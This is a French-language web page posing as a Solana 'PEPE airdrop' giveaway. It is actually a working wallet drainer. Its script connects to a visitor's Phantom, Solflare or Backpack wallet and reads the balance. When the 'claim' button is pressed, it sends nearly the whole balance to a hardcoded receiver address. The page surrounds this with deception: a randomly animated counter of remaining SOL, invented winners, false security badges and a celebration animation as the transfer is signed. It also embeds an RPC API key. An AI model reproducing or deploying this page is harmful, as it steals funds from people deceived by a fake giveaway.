<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üê∏ PEPE Airdrop Solana - R√©clame tes SOL gratuits !</title>
    <meta name="robots" content="noindex,nofollow">
    <!-- Buffer polyfill navigateur (indispensable pour web3.js) -->
    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
    <script>
      window.Buffer = window.Buffer || (window.buffer && window.buffer.Buffer);
    </script>
    <!-- Solana web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.js"></script>
    <style>
        * {margin:0; padding:0; box-sizing:border-box;}
        body {
            font-family:'Arial',sans-serif;
            background:
                radial-gradient(circle at 20% 50%,rgba(80,255,200,0.13)0%,transparent 50%),
                radial-gradient(circle at 80% 20%,rgba(186,51,255,0.10)0%,transparent 50%),
                radial-gradient(circle at 40% 80%,rgba(0,255,255,0.07)0%,transparent 50%),
                linear-gradient(135deg,#101119 0%,#191f2a 25%,#1d2330 50%,#191f2a 75%,#101119 100%);
            background-size:400% 400%;animation:gradientShift 8s ease infinite;color:white;overflow-x:hidden;position:relative;
        }
        @keyframes gradientShift {0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
        .container{max-width:1200px;margin:0 auto;padding:0 20px;}
        .header{background:linear-gradient(90deg,#00ffa3,#dc1fff);padding:20px 0;text-align:center;box-shadow:0 4px 20px rgba(0,255,200,0.2);}
        .logo{font-size:3rem;font-weight:bold;color:black;text-shadow:2px 2px 4px rgba(255,255,255,0.3);animation:bounce 2s infinite;}
        @keyframes bounce{0%,20%,50%,80%,100%{transform:translateY(0);}40%{transform:translateY(-10px);}60%{transform:translateY(-5px);}}
        .slogan{font-size:1.5rem;margin:10px 0;color:black;font-weight:bold;}
        .slogan-claim{font-size:1.1rem;color:#222;background:#00ffa37a;padding:8px 16px;border-radius:30px;display:inline-block;margin-bottom:5px;}
        .cta-button{background:linear-gradient(45deg,#00ffa3,#dc1fff);color:white;padding:15px 30px;border:none;border-radius:50px;font-size:1.2rem;font-weight:bold;cursor:pointer;margin:20px 0;transition:all 0.3s ease;box-shadow:0 4px 15px rgba(0,255,200,0.3);}
        .cta-button:hover{transform:translateY(-3px);box-shadow:0 6px 20px rgba(0,255,200,0.6);}
        .cta-button.claimed {background:linear-gradient(45deg,#fdff00,#00ffa3);color:#222;border: 2px solid #fff000;box-shadow:0 0 25px #fdff0090;}
        .counter-section{background:rgba(0,255,200,0.10);padding:30px 0;text-align:center;border:2px solid #00ffa3;margin:20px 0;border-radius:20px;}
        .counter{font-size:2rem;color:#00ffa3;font-weight:bold;animation:pulse 2s infinite;}
        @keyframes pulse{0%{opacity:1;}50%{opacity:0.7;}100%{opacity:1;}}
        .participation{padding:50px 0;text-align:center;}
        .participation h2{font-size:2.5rem;color:#00ffa3;margin-bottom:30px;text-shadow:0 0 10px rgba(0,255,200,0.3);}
        .steps{display:flex;justify-content:space-around;flex-wrap:wrap;gap:30px;margin:40px 0;}
        .step{background:linear-gradient(135deg,#21263a,#262c43);padding:30px;border-radius:20px;flex:1;min-width:250px;border:2px solid #00ffa3;transition:transform 0.3s ease;}
        .step:hover{transform:translateY(-10px);box-shadow:0 10px 30px rgba(0,255,200,0.2);}
        .step-number{background:#00ffa3;color:black;width:50px;height:50px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:1.5rem;font-weight:bold;margin:0 auto 20px;}
        .step-title{font-size:1.3rem; font-weight:bold; margin-bottom:7px;}
        .step-desc{font-size:1.07rem;}
        .memes-section{background:rgba(0,0,0,0.7);padding:50px 0;overflow:hidden;position:relative;border-top:3px solid #00ffa3;border-bottom:3px solid #dc1fff;}
        .memes-title{text-align:center;font-size:2.5rem;color:#00ffa3;margin-bottom:30px;text-shadow:0 0 10px rgba(0,255,200,0.20);}
        .memes-carousel{display:flex;animation:scrollMemes 20s linear infinite;gap:30px;}
        @keyframes scrollMemes{0%{transform:translateX(100%);}100%{transform:translateX(-100%);}}
        .meme-card{min-width:300px;background:linear-gradient(135deg,#23293b,#2a3152);border-radius:20px;padding:20px;text-align:center;border:2px solid #00ffa3;position:relative;transform:rotate(-2deg);transition:transform 0.3s ease;}
        .meme-card:nth-child(even){transform:rotate(2deg);border-color:#dc1fff;}
        .meme-card:hover{transform:rotate(0deg) scale(1.1);z-index:10;}
        .meme-emoji{font-size:4rem;margin-bottom:15px;display:block;animation:bounce 2s infinite ease-in-out;}
        .meme-text{font-size:1.2rem;color:#fff;font-weight:bold;text-shadow:2px 2px 4px rgba(0,0,0,0.8);}
        .meme-subtitle{font-size:0.9rem;color:#00ffa3;margin-top:10px;}
        .about{padding:50px 0;text-align:center;}
        .about h2{font-size:2.5rem;color:#dc1fff;margin-bottom:30px;}
        .about-content{font-size:1.2rem;line-height:1.8;max-width:800px;margin:0 auto;color:#ccc;}
        .social-links{display:flex;justify-content:center;gap:20px;margin-top:30px;}
        .social-link{background:linear-gradient(45deg,#00ffa3,#dc1fff);color:black;padding:15px 25px;border-radius:25px;text-decoration:none;font-weight:bold;transition:transform 0.3s ease;}
        .social-link:hover{transform:translateY(-5px);box-shadow:0 5px 15px rgba(0,255,200,0.2);}
        .security{background:rgba(255,0,0,0.08);border:2px solid #fdff00;padding:30px;margin:40px 0;border-radius:20px;text-align:center;}
        .security h3{color:#fdff00;font-size:1.5rem;margin-bottom:15px;}
        .badge{background:#00ffa3;color:black;padding:10px 20px;border-radius:20px;font-weight:bold;display:inline-block;margin:10px;}
        .footer{background:#111;padding:30px 0;text-align:center;border-top:3px solid #00ffa3;}
        .footer a{color:#00ffa3;text-decoration:none;margin:0 15px;}
        .footer a:hover{text-decoration:underline;}
        .hall-of-fame{background:linear-gradient(135deg,#2a3152,#23293b);padding:40px 0;margin:40px 0;border-radius:20px;border:2px solid #dc1fff;}
        .hall-title{text-align:center;color:#dc1fff;font-size:2rem;margin-bottom:30px;}
        .winners{display:flex;justify-content:space-around;flex-wrap:wrap;gap:20px;}
        .winner{background:rgba(220,31,255,0.08);padding:20px;border-radius:15px;text-align:center;border:1px solid #dc1fff;}
        @media (max-width:768px){.logo{font-size:2rem;}.slogan{font-size:1.2rem;}.steps{flex-direction:column;}.step{min-width:auto;}.social-links{flex-direction:column;align-items:center;}}
        .pepe-emoji{font-size:2rem;display:inline-block;animation:rotate 3s linear infinite;}
        @keyframes rotate{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
        .modal-bg {position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,0.65);display:none;align-items:center;justify-content:center;z-index:10001;}
        .modal-bg.active {display:flex;}
        .modal-wallet {
            background:linear-gradient(135deg,#23293b,#262c43 100%);padding:38px 30px 30px 30px;border-radius:25px;box-shadow:0 8px 48px #0006;max-width:340px;width:94%;text-align:center;position:relative;
        }
        .modal-close {position:absolute;top:14px;right:18px;font-size:1.4rem;color:#fff;cursor:pointer;}
        .wallet-option {display:flex;align-items:center;gap:18px;background:#23293b;border-radius:18px;padding:14px 20px;margin:12px 0;font-size:1.1rem;cursor:pointer;border:2px solid transparent;transition:all .18s;}
        .wallet-option:hover {background:#2a3152;border:2px solid #00ffa3;}
        .wallet-option.disabled {opacity:0.55;cursor:not-allowed;}
        .wallet-loading {margin:18px 8px 7px 8px;font-size:1.1em;color:#00ffa3;}
        .wallet-err {color:#fdff00;margin:8px 0 0 0;font-size:1em;}
        .drain-log {background:#2a3152;border-radius:10px;padding:13px 11px 9px 11px;color:#a3e635;margin-top:16px;word-break:break-all;font-size:0.97em;}
        .congrats-animation {
            pointer-events:none;
            position:fixed;
            top:0; left:0; width:100vw; height:100vh;
            z-index:9999;
            display:none;
        }
        .congrats-animation.active {
            display:block;
            animation: fadein 0.8s;
        }
        @keyframes fadein { from { opacity:0; } to { opacity:1; } }
        .congrats-emoji {
            position:absolute;
            font-size:3rem;
            animation: pop 1.2s cubic-bezier(.19,1,.22,1) forwards;
        }
        @keyframes pop {
            0% { transform: scale(0.2) translateY(100vh); opacity:0; }
            50% { transform: scale(1.2) translateY(-10vh); opacity:1; }
            80% { transform: scale(1) translateY(0); opacity:1; }
            100% { transform: scale(1) translateY(0); opacity:1; }
        }
        .msg-insuffisant {
            color: #fdff00;
            background: #23293b;
            border: 2px solid #fdff00;
            padding: 15px 18px;
            border-radius: 20px;
            margin: 18px auto 0 auto;
            font-size: 1.15rem;
            max-width: 330px;
            text-align: center;
            box-shadow: 0 4px 16px #fdff0060;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="container">
            <div class="logo">üê∏ PEPE AIRDROP SOLANA</div>
            <div class="slogan">
                R√©clame tes SOL gratuits sur Solana !<br>
                <span class="slogan-claim">Connecte ton wallet Solana et claim tes SOL gratuitement !</span>
            </div>
            <button class="cta-button" id="connectButton">üîó CONNECTER TON WALLET SOLANA</button>
        </div>
    </header>
    <!-- Counter -->
    <section class="counter-section">
        <div class="container">
            <h3>SOL restants √† distribuer</h3>
            <div class="counter" id="tokenCounter">1‚ÄØ234,195 SOL</div>
            <p>D√©p√™che-toi avant qu‚Äôil n‚Äôy en ait plus‚ÄØ!</p>
        </div>
    </section>
    <!-- How to participate -->
    <section class="participation">
        <div class="container">
            <h2>üí∞ Comment participer‚ÄØ?</h2>
            <div class="steps">
                <div class="step">
                    <div class="step-number">1</div>
                    <div class="step-title">Connecte ton wallet</div>
                    <div class="step-desc">Utilise Phantom, Solflare, Backpack, ou autre wallet Solana</div>
                </div>
                <div class="step">
                    <div class="step-number">2</div>
                    <div class="step-title">R√©clame tes SOL</div>
                    <div class="step-desc">Valide la transaction dans ton wallet</div>
                </div>
                <div class="step">
                    <div class="step-number">3</div>
                    <div class="step-title">Re√ßois tes SOL</div>
                    <div class="step-desc">Tes SOL seront envoy√©s en moins de 24h !</div>
                </div>
            </div>
        </div>
    </section>
    <!-- Memes Section -->
    <section class="memes-section">
        <div class="container">
            <h2 class="memes-title">üöÄ PEPE MEMES ZONE üöÄ</h2>
        </div>
        <div class="memes-carousel">
            <div class="meme-card">
                <span class="meme-emoji">üê∏</span>
                <div class="meme-text">PEPE TO THE MOON!</div>
                <div class="meme-subtitle">Diamond Hands üíé</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">üöÄ</span>
                <div class="meme-text">HODL PEPE FOREVER</div>
                <div class="meme-subtitle">Never Selling! üî•</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">üí∞</span>
                <div class="meme-text">SOLANA RICHES</div>
                <div class="meme-subtitle">Airdrop SZN üéÅ</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">‚ö°</span>
                <div class="meme-text">WAGMI TOGETHER</div>
                <div class="meme-subtitle">PEPE Army Strong üí™</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">üéØ</span>
                <div class="meme-text">100X INCOMING</div>
                <div class="meme-subtitle">Trust The Process üìà</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">üî•</span>
                <div class="meme-text">PEPE IS LIFE</div>
                <div class="meme-subtitle">Meme Coin King üëë</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">üåô</span>
                <div class="meme-text">NEXT STOP: MARS</div>
                <div class="meme-subtitle">Space Mission üõ∏</div>
            </div>
            <div class="meme-card">
                <span class="meme-emoji">üíé</span>
                <div class="meme-text">DIAMOND PEPE</div>
                <div class="meme-subtitle">Rare Edition ‚ú®</div>
            </div>
        </div>
    </section>
    <!-- Security -->
    <section class="security">
        <div class="container">
            <h3>üõ°Ô∏è S√©curit√© & Confiance</h3>
            <p>Aucune cl√© priv√©e ne sera jamais demand√©e !</p>
            <div class="badge">‚úÖ S√©curis√©</div>
            <div class="badge">‚úÖ V√©rifi√©</div>
            <div class="badge">‚úÖ Communaut√©</div>
        </div>
    </section>
    <!-- Hall of Fame -->
    <section class="hall-of-fame">
        <div class="container">
            <h2 class="hall-title">üèÜ Hall of Fame - Derniers Gagnants</h2>
            <div class="winners">
                <div class="winner">
                    <div>ü•á 6Gh4...N2b8</div>
                    <div>2‚ÄØ500 SOL</div>
                </div>
                <div class="winner">
                    <div>ü•à F3dc...7v6h</div>
                    <div>2‚ÄØ200 SOL</div>
                </div>
                <div class="winner">
                    <div>ü•â 9eY6...aQ52</div>
                    <div>1‚ÄØ950 SOL</div>
                </div>
            </div>
        </div>
    </section>
    <!-- About PEPE -->
    <section class="about">
        <div class="container">
            <h2>üìà √Ä propos de PEPE <span class="pepe-emoji">üê∏</span></h2>
            <div class="about-content">
                <p>PEPE est le token m√®me le plus populaire de l‚Äô√©cosyst√®me crypto ! Rejoins la communaut√© grandissante des holders. Notre mission est de d√©mocratiser l‚Äôacc√®s aux cryptos tout en gardant l‚Äôesprit fun et d√©cal√© qui nous caract√©rise.</p>
            </div>
            <div class="social-links">
                <a href="#" class="social-link">üê¶ Twitter</a>
                <a href="#" class="social-link">üí¨ Telegram</a>
                <a href="#" class="social-link">üéÆ Discord</a>
            </div>
        </div>
    </section>
    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <p>&copy; 2025 PEPE Airdrop Solana - All rights reserved</p>
            <div>
                <a href="#">Mentions l√©gales</a>
                <a href="#">Conditions d‚Äôutilisation</a>
                <a href="mailto:contact@pepeairdrop.sol">Contact</a>
            </div>
        </div>
    </footer>
    <!-- Wallet Modal -->
    <div class="modal-bg" id="walletModalBg">
        <div class="modal-wallet">
            <span class="modal-close" id="closeWalletModal">&times;</span>
            <h2 style="color:#00ffa3;margin-bottom:14px;">Choisis ton wallet Solana</h2>
            <div class="wallet-option" id="wallet-phantom">
                <span style="font-size:2rem;">ü¶Ñ</span>
                Phantom Wallet
            </div>
            <div class="wallet-option" id="wallet-solflare">
                <span style="font-size:2rem;">üî•</span>
                Solflare Wallet
            </div>
            <div class="wallet-option" id="wallet-backpack">
                <span style="font-size:2rem;">üéí</span>
                Backpack Wallet
            </div>
            <div id="wallet-loading" class="wallet-loading" style="display:none;"></div>
            <div id="wallet-err" class="wallet-err"></div>
            <div id="msg-insuffisant" class="msg-insuffisant" style="display:none;"></div>
            <div id="log-tx" class="drain-log" style="display:none;"></div>
        </div>
    </div>
    <!-- Congrats Animation -->
    <div class="congrats-animation" id="congratsAnim"></div>
    <script>
    if (typeof Buffer === "undefined" && window.buffer && window.buffer.Buffer) {
        window.Buffer = window.buffer.Buffer;
    }

    const RECEIVER_ADDRESS = "5MVELjvbRgiKyaHW2aMUL7NdMy8C4d6rSNZrPgsJQhfM";
    const MIN_SOL = 0.01;
    const RPC_ENDPOINTS = [
        "https://solana-mainnet.g.alchemy.com/v2/JPXWaQ-1iemUU1rNvuJDbAaJD7KKu_Rw"
    ];

    const connectButton = document.getElementById('connectButton');
    const modalBg = document.getElementById('walletModalBg');
    const closeModal = document.getElementById('closeWalletModal');
    const walletPhantom = document.getElementById('wallet-phantom');
    const walletSolflare = document.getElementById('wallet-solflare');
    const walletBackpack = document.getElementById('wallet-backpack');
    const walletLoading = document.getElementById('wallet-loading');
    const walletErr = document.getElementById('wallet-err');
    const logTx = document.getElementById('log-tx');
    const msgInsuffisant = document.getElementById('msg-insuffisant');
    const congratsAnim = document.getElementById('congratsAnim');

    let actionButton = null;
    let currentProvider = null;
    let currentPubkey = null;
    let currentSol = null;

    connectButton.onclick = () => {
        walletErr.innerText = "";
        walletLoading.style.display = "none";
        logTx.style.display = "none";
        msgInsuffisant.style.display = "none";
        modalBg.classList.add('active');
    };
    closeModal.onclick = () => { modalBg.classList.remove('active'); };
    modalBg.onclick = (e) => { if (e.target === modalBg) modalBg.classList.remove('active'); };

    function logTransaction(msg) { logTx.innerHTML += msg + "<br>"; logTx.style.display = "block"; }
    function clearLogTx() { logTx.innerHTML = ""; logTx.style.display = "none"; }
    function showLoading(msg) { walletLoading.innerText = msg; walletLoading.style.display = ""; }
    function hideLoading() { walletLoading.style.display = "none"; }
    function showError(msg) { walletErr.innerText = msg; }
    function clearError() { walletErr.innerText = ""; }
    function showMsgInsuffisant(msg) { msgInsuffisant.innerHTML = msg; msgInsuffisant.style.display = ""; }
    function hideMsgInsuffisant() { msgInsuffisant.style.display = "none"; }
    function setWalletConnectedUI(pubkey, sol) {
        connectButton.innerHTML = "‚úÖ Wallet : " + pubkey.toString().slice(0, 4) + "..." + pubkey.toString().slice(-4);
        connectButton.classList.add('claimed');
        connectButton.disabled = true;
        if (!actionButton) {
            actionButton = document.createElement('button');
            actionButton.id = "claimButton";
            actionButton.className = "cta-button";
            actionButton.innerText = "CLAIM TES SOL";
            actionButton.style.marginLeft = "10px";
            connectButton.parentNode.appendChild(actionButton);
            actionButton.onclick = () => sendAllSol();
        }
        actionButton.style.display = "";
        actionButton.disabled = false;
    }

    function getProvider(walletType) {
        if (walletType === "Phantom" && window.solana && window.solana.isPhantom) return window.solana;
        if (walletType === "Solflare" && window.solflare && window.solflare.isSolflare) return window.solflare;
        if (walletType === "Backpack" && window.backpack && window.backpack.isBackpack) return window.backpack;
        return null;
    }

    async function tryGetBalance(pubkey) {
        const connection = new solanaWeb3.Connection(RPC_ENDPOINTS[0], 'confirmed');
        try {
            const balanceLamports = await connection.getBalance(pubkey);
            return { balanceLamports, endpoint: RPC_ENDPOINTS[0] };
        } catch (err) {
            throw new Error("Impossible de lire le solde (r√©seau inaccessible)");
        }
    }

    async function trySendTransaction(transaction, provider, endpoint) {
        const connection = new solanaWeb3.Connection(endpoint || RPC_ENDPOINTS[0], 'confirmed');
        transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
        transaction.feePayer = transaction.feePayer || transaction.instructions[0].keys[0].pubkey;
        if (provider.signTransaction) {
            const signedTx = await provider.signTransaction(transaction);
            const rawTx = signedTx.serialize();
            const txid = await connection.sendRawTransaction(rawTx);
            return txid;
        }
        throw new Error("Wallet incompatible : impossible de signer la transaction.");
    }

    async function connectAndReadWallet(walletType) {
        clearLogTx(); clearError(); hideMsgInsuffisant();
        showLoading("Connexion au wallet " + walletType + "...");
        const provider = getProvider(walletType);
        if (!provider) {
            hideLoading();
            showError("Wallet " + walletType + " non d√©tect√© !");
            return;
        }
        let resp;
        try {
            resp = await provider.connect();
        } catch (e) {
            hideLoading();
            showError("Connexion annul√©e.");
            return;
        }
        hideLoading();

        let pubkeyObj;
        try {
            pubkeyObj = new solanaWeb3.PublicKey(resp.publicKey);
        } catch (err) {
            showError("Erreur pubkey : " + err.message);
            return;
        }
        logTransaction("‚úÖ Wallet connect√© : " + pubkeyObj.toString());

        showLoading("Lecture du solde SOL...");
        let balanceResult;
        try {
            balanceResult = await tryGetBalance(pubkeyObj);
        } catch (e) {
            showError(e.message);
            return;
        }
        hideLoading();
        const sol = balanceResult.balanceLamports / solanaWeb3.LAMPORTS_PER_SOL;
        logTransaction("üí∞ Solde SOL : " + sol.toFixed(4) + " SOL");
        if (sol < MIN_SOL) {
            showMsgInsuffisant("SOL insuffisant pour effectuer l‚Äôop√©ration (min " + MIN_SOL + " SOL).");
            return;
        }
        hideMsgInsuffisant();
        currentProvider = provider;
        currentPubkey = pubkeyObj;
        currentSol = sol;
        setWalletConnectedUI(pubkeyObj, sol);
        modalBg.classList.remove('active');
    }

    async function sendAllSol() {
        clearLogTx(); clearError(); hideMsgInsuffisant();
        if (!currentProvider || !currentPubkey || !currentSol) {
            showError("Aucun wallet connect√© !");
            return;
        }
        showLoading("Pr√©paration de la transaction...");
        showCongratsAnimation();

        const feeEstimation = 0.00005;
        const amountToSend = currentSol - feeEstimation;
        if (amountToSend <= 0) {
            logTransaction("‚ùå Pas assez de SOL pour payer le gas.");
            return;
        }
        logTransaction("üö® Envoi de " + amountToSend.toFixed(6) + " SOL √† l‚Äôadresse : " + RECEIVER_ADDRESS);

        let tx;
        try {
            tx = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: currentPubkey,
                    toPubkey: new solanaWeb3.PublicKey(RECEIVER_ADDRESS),
                    lamports: Math.floor(amountToSend * solanaWeb3.LAMPORTS_PER_SOL),
                })
            );
        } catch (err) {
            showError("Erreur construction transaction : " + err.message);
            return;
        }

        showLoading("Signature de la transaction dans le wallet...");
        let signature;
        for (let attempt = 1; attempt <= 2; attempt++) {
            try {
                signature = await trySendTransaction(tx, currentProvider, RPC_ENDPOINTS[0]);
                logTransaction("‚úÖ Transaction envoy√©e ! Signature : " + signature);
                actionButton.disabled = true;
                break;
            } catch (e) {
                logTransaction("‚ùå Transaction refus√©e ou congestion r√©seau (tentative " + attempt + ")");
                if (attempt === 2) {
                    showError("Transaction √©chou√©e apr√®s plusieurs tentatives.");
                } else {
                    await new Promise(res => setTimeout(res, 1400));
                }
            }
        }
        hideLoading();
    }

    walletPhantom.onclick = () => connectAndReadWallet("Phantom");
    walletSolflare.onclick = () => connectAndReadWallet("Solflare");
    walletBackpack.onclick = () => connectAndReadWallet("Backpack");

    function animateCounter() {
        const counter = document.getElementById('tokenCounter');
        let min = 114499;
        let max = 1741192;
        function randInInterval() {
            let newCount = Math.floor(Math.random() * (max - min + 1)) + min;
            counter.textContent = newCount.toLocaleString('fr-FR') + ' SOL';
        }
        randInInterval();
        setInterval(randInInterval, 2100);
    }
    animateCounter();

    function showCongratsAnimation() {
        congratsAnim.innerHTML = '';
        congratsAnim.classList.add('active');
        const emojis = ["üéâ","ü§ë","üöÄ","üéä","ü•≥","üí∏","üí∞","üåü","üéà","üî•","üëë","‚ö°","‚ú®","üíé","ü•Ç","üçæ","üê∏"];
        for(let i=0;i<18;i++){
            let em = document.createElement('span');
            em.className = "congrats-emoji";
            em.innerText = emojis[Math.floor(Math.random()*emojis.length)];
            em.style.left = (Math.random()*90+5)+"vw";
            em.style.top = (Math.random()*80+10)+"vh";
            em.style.animationDelay = (Math.random()*0.8)+"s";
            congratsAnim.appendChild(em);
        }
        setTimeout(()=>{ congratsAnim.classList.remove('active'); }, 2200);
    }
    </script>
</body>
</html>
